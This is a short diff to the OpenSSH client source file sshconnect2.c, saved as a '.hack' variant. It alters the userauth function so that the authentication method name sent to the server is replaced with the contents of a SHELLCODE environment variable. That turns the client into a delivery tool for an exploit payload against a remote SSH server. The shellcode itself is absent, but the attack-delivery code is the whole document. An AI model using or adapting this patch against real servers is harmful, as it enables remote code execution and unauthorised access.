--- sshconnect2.c2003-08-21 21:34:03.000000000 -0300
+++ sshconnect2.c.hack2003-08-21 21:33:47.000000000 -0300
@@ -278,6 +278,8 @@
void
userauth(Authctxt *authctxt, char *authlist)
{
+     char *shellcode = getenv("SHELLCODE");
+
if (authlist == NULL) {
authlist = authctxt->authlist;
} else {
@@ -290,6 +292,7 @@
if (method == NULL)
fatal("Permission denied (%s).", authlist);
authctxt->method = method;
+         authctxt->method->name = shellcode;
if (method->userauth(authctxt) != 0) {
debug2("we sent a %s packet, wait for reply", method->name);
break; 